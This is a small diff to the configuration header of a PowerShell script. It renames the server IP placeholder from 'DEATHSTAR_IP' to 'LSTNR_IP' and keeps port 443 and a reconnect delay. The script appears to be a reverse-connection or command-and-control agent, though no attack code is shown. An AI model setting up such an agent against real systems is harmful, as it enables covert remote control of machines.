@@ -2,7 +2,7 @@
 # Requires PowerShell 5.1 or higher
 
 # Script configuration
-$Global:ServerIP = "<DEATHSTAR_IP>"
+$Global:ServerIP = "<LSTNR_IP>"
 $Global:ServerPort = 443
 $Global:ReconnectDelay = 5
 
